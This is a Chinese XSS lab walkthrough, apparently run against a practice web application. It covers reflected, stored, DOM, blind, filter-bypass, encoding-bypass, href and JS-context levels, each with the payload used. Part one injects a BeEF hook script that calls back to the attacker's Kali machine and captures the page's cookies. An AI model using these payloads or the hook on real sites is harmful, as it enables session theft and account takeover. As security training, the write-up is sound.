# 1.反射型XSS（get）
## 第一步：输入正常信息
查看提示，输入正常的数据kobe，发现返回图片信息，并在url中也有相应的参数

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777603923368-741a0137-ce3e-40be-89f6-91631915cc4d.png)

## 第二步：触发XSS
在对应参数位置上输入简单脚本<script>alert(1)</script>，弹出对话框 1，验证有XSS漏洞

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777603961981-ed650d89-e51d-458a-99c6-a071190df95a.png)

另一种方式：

直接输入JS代码，发现这里有**字符数限制**为20字符

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777599677588-4428a4c5-f93b-4e06-99a0-a907fced1cb4.png)

**删掉**该属性，发现可以正常输入

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777599700900-c6e15155-bdc1-4697-93c0-a7b58581a563.png)

## 第三步：beef-xss连接
kali中启动beef-xss，给出url是http://<IP>:3000/ui/panel，给出脚本<script src="http://<IP>:3000/hook.js"></script>，将IP替换为kali攻击机的IP，我这里是192.168.10.225

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777602383446-27bb6e30-b875-4928-a7db-cade98c507b0.png)

第一次安装beef-xss会提示你输入密码，账号是默认为beef

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777602605330-7cd87cb5-1492-47fa-8734-2a264ecce8f5.png)

这里从**url**中输入xss脚本

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777602664983-aaa4f841-ebb9-4c2e-a4de-1b7fff84d192.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777602556009-51f0f36a-bd85-4100-8d8b-ea9ea4ad5b9c.png)

beef-xss成功上线被控主机

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777602583562-9d90bf09-0b30-420e-9890-8795d41cb37b.png)

这里成功截获该网页的cookie

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777603363867-71e8b90b-357f-4c06-811c-b7de8b8452e9.png)

一段时间后，cookie就能获取

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777603391721-05c5287a-e4f9-47ab-a9e3-cecfc68524ae.png)

# 2.反射型XSS（post）
## 第一步：输入正常信息
查看提示后，先进行登录，然后输入正常信息kobe

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777603649230-11750656-4a69-49e7-af92-80f894428844.png)

这里发现并没有在url中找到参数，猜测为post请求

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777603623311-f8ccb877-85dc-42ee-8314-ba17418f1812.png)

## 第二步：开启BP代理
打开bp代理，开启拦截，成功截获数据包，发现参数在**请求体**中

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777604217568-f0062787-972b-46ba-a077-263526037e00.png)

## 第三步：触发XSS
更改参数为简单xss脚本<script>alert(1)</script>，并放行数据包，成功弹窗 1

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777604312449-293b69ba-09cc-411f-b2db-b3b0d6a1d6a1.png)

# 3.存储型XSS
## 第一步：输入正常信息
发现信息会出现在下方留言列表中，猜测输入的内容都会显示在下方

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777604524660-681aca2f-e758-4a6d-842f-a6166812dd20.png)

## 第二步：触发XSS
输入简单XSS脚本，提交后成功触发弹窗 1，并在下方留言列表中发现有一个空白，猜测为刚才的js代码

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777604624766-42b37bf4-ef4d-404d-9d2b-06eb670b8635.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777604631811-b6ccb904-04dd-4d8f-bcd3-e7a70cf890ee.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777604637978-26565071-8052-4207-975e-c7b93006a78f.png)

## 第三步：刷新页面
发现再一次出现弹窗，猜测为该<script>alert(1)</script>代码被存储在数据库中，每一次刷新都会从数据库中把这个脚本渲染在网页中，从而触发该脚本

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777604722036-dea19d33-3954-43e0-9f8f-9273e4ddca96.png)

# 4.DOM型XSS
> DOM型XSS-X只是多了一步点击，步骤一样
>

## 第一步：输入正常信息
输入kobe后，发现下方出现链接，点击后为Not Found。然后我们点击F12，进行检查，发现这里输入的内容再标签里，下方出现的文字是该标签的链接

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777775522292-c89dd090-e0fe-46a8-87b5-6974be656bae.png)

## 第二步：触发XSS
这里我们进行思考，如何触发XSS

可以选择闭合a标签的href属性，添加一个可以触发xss的属性，比如onclick属性，闭合属性，添加onclick，当点击链接的时候触发xss

```php
' onclick='alert(1)'>
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777775837973-cf270705-2b76-4b74-a32d-e0ca151f5ec8.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777775846052-1dd44489-bfd6-4704-9ad8-363c1059459a.png)

也可以直接就触发

闭合a标签后，可以尝试再后面添加一个标签，经典的可以添加一个错误图片标签，并添加属性onerror，onerror是当图片出现问题时，进行的处理，这里直接将图片的链接设为空

```php
' onclick='alert(1)'><img src='' onerror='alert(1)'>
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777775958191-af1fd2ed-c10c-4b49-9cb8-be71af4afb39.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777775933594-fea8c392-55c9-48d4-8f91-8bc6c6baf878.png)

# 5.XSS之盲打
## 第一步：输入正常信息
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777776212745-65f885da-cc9d-417d-b811-9b5c5daaf818.png)

## 第二步：触发XSS
这里尝试提交脚本，没起作用

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777776274057-dde0193e-65e8-4819-9e2d-0cdc6ee4539a.png)

这个内容是传到我们系统**后台**的，我们点击提示，查看后台登录

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777776331585-30e8cc30-35c0-4ba8-a19a-c268fc5b5c81.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777776382928-6ac8c800-6d5c-4fa2-95d7-ae320da9383e.png)

这里一进来就弹了**两次弹窗**，说明前端输入的两个<script>alert(1)</script> 在后台起了作用，每次管理员访问后台页面的时候，都会触发该弹窗。

> 危害：可以利用beef-xss连接，获取cookie
>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777776490719-a344f3d8-deb8-4309-9fc2-8f06ebad026c.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777776497145-daa5a002-5e5e-4d50-bddf-e0e027d718dc.png)

# 6.XSS之过滤
## 第一步：输入正常信息
输入kobe，下方字符**正常输出**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777776923973-36d8143f-7d10-44e7-9a5b-da376c09b771.png)

## 第二步：验证过滤机制
输入<script>alert(1)</script>，发现下方提示中只输出了>，说明，其他字符**被过滤**了

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777776624816-0aa01514-5f15-4478-b700-fc32a02dd0bf.png)

我们尝试一个一个的输入，验证**过滤的机制**

单个输入<script>，发现只输出>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777777688552-ea06fe54-543d-4a62-acef-147b74b5413a.png)

单个输入<script，发现无输出

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777777181577-ecfe8e1c-07e7-4317-b4b8-8c69e6e7bb44.png)

尝试输入<scri<scriptpt，发现依旧无输出，猜测这里过滤了任何以<script顺序输入的内容

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777777442136-55da5dbd-d70c-40da-ae48-3a384e87be19.png)

我们查看源代码发现这里是进行了正则过滤，从<开始，到t结束，只要是<script顺序都会被过滤

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777777344533-62e612f0-d0c4-42d6-9e95-1cb2d119603b.png)

## 第三步：绕过验证并触发XSS
这里可以使用**大小写**进行绕过

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777777949727-0d263c03-d1ff-4c47-9b24-2ea06ec5789d.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777777936408-d8580124-a799-4651-ab17-b889b0e6ad68.png)

也可以使用**其他标签**进行绕过

```php
<img src='' onerror='alert(1)'>
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777778051203-8b3d41ef-5b30-4947-8f6f-c22517d6a95e.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777778070743-777f2687-11c4-4934-800e-fb77e0c64934.png)

# 7.XSS之htmlspecialchars
## 第一步：输入正常信息
输入kobe，发现下方出现kobe被记录，并且可以点击

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777778126667-f3a1bc7e-7c0f-4acf-a8d1-9f0e7e535810.png)

## 第二步：绕过机制并触发XSS
输入<script>alert(1)</script>，发现没有触发xss弹窗，并且点击后发现为Forbidden

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777778234516-cf6aec76-01f5-4c9e-901c-a1a0799695b5.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777778242909-43d0a086-018f-45b2-a30b-952697f4b390.png)

查看网页源代码后，发现输入的特殊的字符<>被转义，&lt &gt

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777778421692-d931ebd2-d30a-45a5-b801-af94e30e5820.png)

F12调试发现，这里可能采用**闭合标签**的方式绕过

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777778491230-5f658da6-1c56-444c-9dcd-27e7430b5862.png)

我们输入 ' 尝试验证一下，是否有转义，发现**正常输出**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777778576815-10e53e72-f923-4412-8f79-ccb8d4322c60.png)

这里输入进行闭合

```php
' onclick='alert(1)'>
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777778804553-7baf7e42-31e1-401f-8135-2fd6757560cf.png)

点击后，发现成功弹窗

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777778693629-c4524dce-3b23-48e5-bbaa-9e7a576ed9b7.png)

# 8.XSS之HREF输出
## 第一步：正常输入
正常输入网址，这里以百度为例，https://www.baidu.com

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777778906877-c9faf672-0697-488e-aef9-208527b28c91.png)

点击链接后，成功跳转

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777779009568-08c23fa3-2847-4b8f-a9f3-d4154c428113.png)

## 第二步：绕过HREF并触发XSS
### <font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">「伪协议」基础概念</font>
<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">平时见过的协议：</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">http://</font>``<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">https://</font>``<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">ftp://</font>`

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">这些是</font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">真协议</font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">，用来访问网络资源。</font>

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">而 </font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">javascript:</font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> 是</font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">伪协议</font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">（Pseudo-Protocol）。</font>

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">它</font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">不访问网络</font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">，它</font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">直接告诉浏览器</font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">：冒号后面的内容，是 JavaScript 代码，你帮我执行！</font>

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> HTML 规定：</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"><a href="???"></font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> 里面可以放</font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">任何协议</font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">。  </font>

`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">javascript:alert(1)</font>` 是 `**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">javascript:</font>**`**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> 伪协议</font>**的用法，它让浏览器把冒号后的内容当作 JS 代码执行，放在 `<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"><a href="..."></font>` 里，点击链接就会运行 `<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">alert(1)</font>`。  

```php
javascript:alert(1)
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777779125518-1fa4300b-0f6f-4069-96b7-9251efd1c960.png)

成功触发xss弹窗

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777779148930-43807387-d694-4be6-b25e-aa99152c1b5b.png)

# 9.XSS之JS输出
## 第一步：输入正常信息
输入kobe，发现正常输出结果

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777779487383-f36bdcb5-f750-49fe-bc6d-3d10bed935a7.png)

查看源代码后，发现js脚本位置是直接将内容保存在一个变量中

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777779461506-683b923b-20e4-4e7f-adb6-fed9be0fa7c1.png)

## 第二步：闭合变量并触发XSS
源代码是：<font style="color:rgb(0, 0, 0);">$ms='kobe';</font>

<font style="color:rgb(0, 0, 0);">这里进行闭合：'; alert(1)//</font>

<font style="color:rgb(0, 0, 0);">结果是：$ms=''; alert(1)// ';</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777779672519-7463e01b-3217-46b3-9ea5-ed1c50b7d4eb.png)

成功触发xss弹窗

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777779663918-7c160b57-3f74-48c4-85d6-afaa9aa3f6ac.png)



















